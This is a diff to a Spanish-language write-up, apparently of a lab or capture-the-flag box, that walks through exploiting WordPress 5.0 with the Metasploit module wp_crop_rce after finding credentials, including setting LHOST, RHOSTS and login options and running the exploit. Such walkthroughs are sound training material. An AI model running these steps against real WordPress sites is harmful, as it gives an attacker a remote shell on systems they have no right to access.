@@ -112,7 +112,12 @@ Con esto usaremos formato `-c`olorizado, escondemos las respuestas con 403 carac
 
 Una vez tenemos esta clave, podemos probar logearnos en la misma pagina, pero vemos que no tenemos permisos de administrador asi que no podremos hacer mucho, sin embargo existen `exploits` que requieren de autenticacion inicial para funcionar, por ello vemos si existe algun exploit para la version actual de wordpress con `searchsploit wordpress 5.0`{:.language-bash .highlight} y vemos ciertos exploits, pero en este caso nos enfocaremos en el llamado `WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)` que es el que aparenta estar operativo. Al ser de Metasploit debemos lanzar el entorno del mismo con `msfconsole` y esperamos que se active la consola ~~con mucha paciencia~~.
 
-Una vez aca podemos buscar el mismo exploit con `search wordpress 5.0` y anotamos el nombre, enviamos `use exploit/multi/http/wp_crop_rce` y luego debemos completar las opciones del `exploit` con `options`, a partir de ahi seteamos el LHOST, LPORT, RHOS
+Una vez aca podemos buscar el mismo exploit con `search wordpress 5.0` y anotamos el nombre, enviamos `use exploit/multi/http/wp_crop_rce` y luego debemos completar las opciones del `exploit` con `options`, a partir de ahi seteamos el `LHOST, LPORT, RHOSTS, USERNAME y PASSWORD` con `set LHOST 10.8.33.130` por ejemplo:
+![image](https://user-images.githubusercontent.com/85322110/149840797-37e94b55-43f6-4043-8776-7499c62507d9.png)
+![image](https://user-images.githubusercontent.com/85322110/149840827-0f2f5912-a4b5-4422-abd1-5031da93367a.png)
+
+Ya con todo configurado, procemos a escribir `exploit` y darle enter:
+
 
 ## ESCANEO
 
